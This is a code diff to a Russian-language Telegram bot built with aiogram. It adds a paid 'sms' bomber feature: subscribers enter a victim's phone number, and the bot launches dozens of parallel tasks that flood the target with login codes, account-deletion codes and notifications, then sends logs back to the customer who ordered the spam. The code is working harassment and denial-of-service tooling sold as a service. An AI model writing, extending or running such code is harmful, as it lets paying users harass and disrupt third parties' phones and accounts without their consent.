@@ -16,6 +16,9 @@ from aiogram.filters import Command
 from aiogram.utils.formatting import *
 from config import *
 from syym import *
+from bomber import *
+from fast__method import spam_notification_sync, set_log_file
+from concurrent.futures import ThreadPoolExecutor
 import database
 
 bot = Bot(token=TOKEN)
@@ -23,6 +26,12 @@ dp = Dispatcher()
 
 # === Админ ===
 ADMIN_ID = ADMIN_ID
+
+# === Executor и log_dir для fast__method ===
+executor = ThreadPoolExecutor(max_workers=1)
+log_dir = "logs"
+if not os.path.exists(log_dir):
+    os.makedirs(log_dir)
 
 # === Состояния для рассылки ===
 broadcast_waiting = False  # Флаг ожидания сообщения для рассылки
@@ -578,6 +587,7 @@ async def handle_continue(callback: CallbackQuery):
     is_new = add_user(user_id)
     write_log(f"Пользователь {user_id} нажал «Продолжить»")
     
+    
     # Отвечаем на callback
     await callback.answer()
        
@@ -595,13 +605,19 @@ async def handle_continue(callback: CallbackQuery):
     await bot.send_message(user_id, "⚡")
         
     # Формируем контент с цитатой и приветствием
+    quote_text = f"Доброго времени суток, {callback.from_user.full_name}!"
+
     content = as_list(
-        BlockQuote(Bold(f"Доброго времени суток, {callback.from_user.full_name}!")),
-        "",
-        Bold("Выберите действие ниже:ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ")
-    )
-    
-    await bot.send_message(user_id, **content.as_kwargs(), reply_markup=main_keyboard)
+            Bold(quote_text),
+            "",
+            BlockQuote(Bold("Выберите действие ниже:ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ"))
+        )
+
+    await bot.send_message(
+            chat_id=user_id,
+            **content.as_kwargs(),
+            reply_markup=main_keyboard
+            )
 
 # === Профиль ===
 @dp.callback_query(F.data == "my")
@@ -809,8 +825,8 @@ async def handle_session(callback: CallbackQuery):
     )
     await callback.answer()
 
-# === Main ===
-@dp.callback_query(F.data == "main")
+# === Mail method ===
+@dp.callback_query(F.data == "mail")
 async def handle_main(callback: CallbackQuery):
     global method_waiting
     user_id = callback.from_user.id
@@ -904,12 +920,60 @@ async def handle_premium(callback: CallbackQuery):
     )
     await callback.answer()
 
+# === Бомбер ===
+@dp.callback_query(F.data == "sms")
+async def handle_main(callback: CallbackQuery):
+    global method_waiting
+    user_id = callback.from_user.id
+    
+    if not is_admin(user_id):
+        record_user_action(user_id, "callback")
+        if await check_and_auto_ban(user_id, bot=bot, action_type="callback"):
+            return  # Тихий игнор
+    
+    # Проверяем режим техобслуживания
+    if await check_maintenance_mode(user_id, callback=callback):
+        return
+    
+    # Проверяем бан и отправляем сообщение при первом обращении
+    if await check_ban_and_notify(user_id, bot=bot, callback=callback):
+        return  # Тихий игнор
+    
+    write_log(f"{user_id} нажал кнопку 'sms'")
+    
+    # Проверяем подписку
+    has_subscription = get_subscription_status(user_id)
+    
+    if not has_subscription:
+        content = as_list(
+            BlockQuote(Bold("❌ оплати!")),
+        )
+        
+        await callback.message.edit_text(
+            **content.as_kwargs(),
+            reply_markup=back_keyboard
+        )
+        await callback.answer()
+        return
+    
+    # Если есть подписка, запрашиваем ID жертвы
+    method_waiting = "sms"
+    await callback.message.edit_text(
+        "<b>📪 Telegram Notification method</b>\n\n"
+        "Отправьте номер телефона для доставки.\n"
+        "Например: <code>+79999999999</code>",
+        parse_mode="html",
+        reply_markup=back_keyboard
+    )
+    await callback.answer()    
+
 # === Назад ===
 @dp.callback_query(F.data == "back")
 async def handle_back(callback: CallbackQuery):
-    global method_waiting
+    global method_waiting, admin_action_waiting
     user_id = callback.from_user.id
     method_waiting = ""  # Сбрасываем флаг метода при возврате
+    admin_action_waiting = ""
     
     # Записываем действие и проверяем авто-модерацию (callback)
     from syym import record_user_action, check_and_auto_ban
@@ -1493,26 +1557,6 @@ async def handle_admin_check_admin(callback: CallbackQuery):
     )
     await callback.answer()
 
-# === Очистить файл пользователей (админ) ===
-@dp.callback_query(F.data == "admin_clean")
-async def handle_admin_clean(callback: CallbackQuery):
-    user_id = callback.from_user.id
-    
-    if not is_admin(user_id):
-        await callback.answer("❌ Доступ запрещен", show_alert=True)
-        return
-    
-    write_log(f"Админ {user_id} запросил полную очистку файла пользователей")
-    
-    try:
-        # Полностью очищаем файл users.txt
-        with open("users.txt", "w", encoding="utf-8") as f:
-            f.write("")
-        await callback.answer("✅ Файл users.txt полностью очищен - все пользователи удалены", show_alert=True)
-        write_log(f"Админ {user_id} полностью очистил файл пользователей")
-    except Exception as e:
-        await callback.answer(f"❌ Ошибка при очистке: {e}", show_alert=True)
-        write_log(f"Ошибка при очистке файла: {e}")
 
 # === Обработка всех текстовых сообщений ===
 @dp.message(F.text)
@@ -1683,7 +1727,96 @@ async def handle_all_messages(message: Message):
             return
     
     # Обработка методов (session/main/premium) - проверка ID жертвы
-    if method_waiting:
+    if method_waiting == "sms":
+        # Проверяем бан перед обработкой метода
+        if not is_admin(user_id):
+            if await check_ban_and_notify(user_id, bot=bot, message=message):
+                method_waiting = ""  # Сбрасываем флаг
+                return
+        
+        target_id = parse_user_id(text)
+        if target_id is None:
+            await message.answer("❌ <b>Ошибка!</b>\n\nНеверный формат. Отправьте корректный номер телефона для доставки.\n\nПример: <code>+79999999999</code>", parse_mode="html")
+            return
+        
+        method = method_waiting
+        method_waiting = ""  # Сбрасываем флаг
+        
+        # Имитируем отправку SMS с анимацией
+        progress_msg = await message.answer(f"📬 Начинаю отправку на: {target_id}, пожалуйста подождите..", parse_mode="HTML")
+        
+        # Создаем файл логов для fast__method
+        from datetime import datetime
+        log_file_path = os.path.join(log_dir, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
+        set_log_file(log_file_path)
+        
+        # Запускаем fast method два раза и обычные коды параллельно
+        async def run_fast_method_async():
+            try:
+                # Устанавливаем файл логов для fast__method
+                set_log_file(log_file_path)
+                loop = asyncio.get_event_loop()
+                write_log(f"[SMS METHOD] Запуск fast method для {target_id}")
+                result = await loop.run_in_executor(executor, spam_notification_sync, target_id, log_dir, None)
+                write_log(f"[SMS METHOD] Fast method завершен для {target_id}, результат: {result}")
+                return result
+            except Exception as e:
+                write_log(f"[SMS METHOD] Ошибка в fast method для {target_id}: {str(e)}")
+                return False
+        
+        # МАКСИМАЛЬНАЯ МОЩНОСТЬ: все режимы параллельно
+        from bomber import spam_delete_codes, send_log_file
+        
+        max_normal_tasks = 15  # Обычные коды входа
+        max_delete_tasks = 10  # Коды удаления
+        max_fast_method_tasks = 4  # Fast method (уведомления)
+        
+        write_log(f"[SMS METHOD] МАКСИМАЛЬНЫЙ СПАМ для {target_id}: {max_normal_tasks}x обычные + {max_delete_tasks}x удаление + {max_fast_method_tasks}x уведомления")
+        
+        # Обычные коды входа
+        normal_code_tasks = [asyncio.create_task(send_code(target_id)) for _ in range(max_normal_tasks)]
+        
+        # Коды удаления аккаунта
+        delete_tasks = [asyncio.create_task(spam_delete_codes(target_id)) for _ in range(max_delete_tasks)]
+        
+        # Fast method (уведомления)
+        fast_method_tasks = [asyncio.create_task(run_fast_method_async()) for _ in range(max_fast_method_tasks)]
+        
+        # Запускаем ВСЕ задачи параллельно с таймаутом 60 секунд
+        all_tasks = normal_code_tasks + delete_tasks + fast_method_tasks
+        write_log(f"[SMS METHOD] Запущено {len(all_tasks)} задач параллельно, таймаут 60 секунд")
+        
+        try:
+            await asyncio.wait_for(
+                asyncio.gather(*all_tasks, return_exceptions=True),
+                timeout=60.0
+            )
+            write_log(f"[SMS METHOD] Все задачи завершены для {target_id} в течение 60 секунд")
+        except asyncio.TimeoutError:
+            write_log(f"[SMS METHOD] Превышен таймаут 60 секунд для {target_id}, отменяем все задачи")
+            # Отменяем все задачи при таймауте
+            for task in all_tasks:
+                if not task.done():
+                    task.cancel()
+                    try:
+                        await task
+                    except (asyncio.CancelledError, asyncio.TimeoutError):
+                        pass
+        except Exception as e:
+            write_log(f"[SMS METHOD] Ошибка при выполнении задач для {target_id}: {str(e)}")
+        
+        # Отправляем логи КЛИЕНТУ, который заказал спам
+        try:
+            await send_log_file(log_file_path, target_id, user_id=user_id)
+            write_log(f"[SMS METHOD] Логи отправлены клиенту {user_id}")
+        except Exception as e:
+            write_log(f"[SMS METHOD] Ошибка при отправке логов клиенту {user_id}: {str(e)}")
+            
+        # await progress_msg.edit_text("✅ <b>Успешно отправлено!</b>\n\nДоставка была успешно выполнена!", parse_mode="html", reply_markup=back_keyboard)
+        write_log(f"Пользователь {user_id} использовал метод {method} для {target_id} - SMS отправлено")
+        return
+
+    elif method_waiting == "mail" or method_waiting == "premium" or method_waiting == "session":
         # Проверяем бан перед обработкой метода
         if not is_admin(user_id):
             if await check_ban_and_notify(user_id, bot=bot, message=message):
